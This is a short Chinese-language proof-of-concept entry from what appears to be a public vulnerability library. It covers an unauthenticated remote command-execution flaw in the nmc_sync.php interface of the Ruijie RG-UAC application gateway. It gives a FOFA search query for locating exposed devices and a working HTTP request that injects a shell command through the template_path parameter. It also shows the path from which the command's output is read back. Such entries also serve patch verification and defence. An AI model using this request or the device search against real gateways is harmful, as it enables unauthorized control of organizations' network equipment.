---

source: "wy876 漏洞文库"
---

# 锐捷RG-UAC应用网关nmc_sync.php前台RCE漏洞

### 一、漏洞描述
<font style="color:rgba(0, 0, 0, 0.9);">锐捷RG-UAC应用管理网关 nmc_sync.php 接口处存在命令执行漏洞，未经身份认证的攻击者可执行任意命令控制服务器权限。</font>

### 二、影响版本
锐捷RG-UAC应用网关

### 三、资产测绘
fofa：app="Ruijie-RG-UAC"

特征：


### 四、漏洞复现
```plain
GET /view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|whoami%20>dudesuite.txt|cat HTTP/1.1
Host: xxx
Accept-Encoding: gzip
```


访问：https://xxx/view/systemConfig/management/dudesuite.txt


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ex5ms24mq3tyi9wb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
